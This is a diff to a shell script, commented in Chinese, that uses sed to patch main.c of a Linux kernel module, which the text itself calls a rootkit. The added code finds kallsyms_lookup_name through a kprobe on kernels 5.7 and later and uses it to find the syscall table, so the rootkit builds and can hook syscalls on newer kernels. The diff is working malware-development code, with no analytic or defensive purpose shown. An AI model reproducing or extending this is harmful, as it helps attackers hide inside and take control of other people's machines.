@@ -124,6 +124,21 @@ sed -i.bak '/EXPORT_SYMBOL(enable_write_protection);/a\
 EXPORT_SYMBOL(module_previous);\
 EXPORT_SYMBOL(module_hidden);' main.c
 
+# 修复kallsyms_lookup_name未定义问题（内核5.7+）
+echo "添加内核5.7+兼容的kallsyms_lookup_name实现..."
+if ! grep -q "init_kallsyms_lookup_name" main.c; then
+    # 在find_sys_call_table函数之前添加kallsyms_lookup_name兼容代码
+    sed -i '/\/\/ 查找系统调用表/i\
+// 内核5.7+兼容的kallsyms_lookup_name获取方法\n#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)\nstatic unsigned long kln_addr = 0;\nstatic unsigned long (*kallsyms_lookup_name_ptr)(const char *name) = NULL;\n\ntypedef unsigned long (*kallsyms_lookup_name_t)(const char *name);\n\nstatic struct kprobe kp = {\n    .symbol_name = "kallsyms_lookup_name"\n};\n\nstatic int init_kallsyms_lookup_name(void) {\n#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)\n    int ret;\n    ret = register_kprobe(&kp);\n    if (ret < 0) {\n        printk(KERN_ERR "[%s] register_kprobe failed, returned %d\\n", MODULE_NAME, ret);\n        return ret;\n    }\n    kln_addr = (unsigned long) kp.addr;\n    unregister_kprobe(&kp);\n    kallsyms_lookup_name_ptr = (kallsyms_lookup_name_t) kln_addr;\n    printk(KERN_INFO "[%s] kallsyms_lookup_name address: 0x%lx\\n", MODULE_NAME, kln_addr);\n#endif\n    return 0;\n}\n#endif\n' main.c
+    
+    # 修改find_sys_call_table函数以使用新的kallsyms_lookup_name_ptr
+    sed -i 's/#if LINUX_VERSION_CODE > KERNEL_VERSION(4,4,0)/#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)\n    if (kallsyms_lookup_name_ptr) {\n        syscall_table = (unsigned long*)kallsyms_lookup_name_ptr("sys_call_table");\n    } else {\n        printk(KERN_ERR "[%s] kallsyms_lookup_name not available\\n", MODULE_NAME);\n        return NULL;\n    }\n#elif LINUX_VERSION_CODE > KERNEL_VERSION(4,4,0)/' main.c
+    
+    # 在rootkit_init函数中添加初始化调用
+    sed -i '/printk(KERN_INFO "\[%s\] Loading rootkit module/a\
+\n#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)\n    // 初始化kallsyms_lookup_name指针\n    if (init_kallsyms_lookup_name() != 0) {\n        printk(KERN_ERR "[%s] Failed to initialize kallsyms_lookup_name\\n", MODULE_NAME);\n        return -1;\n    }\n#endif' main.c
+fi
+
 echo "main.c符号导出修复完成"
 
 echo "✅ 修复完成"
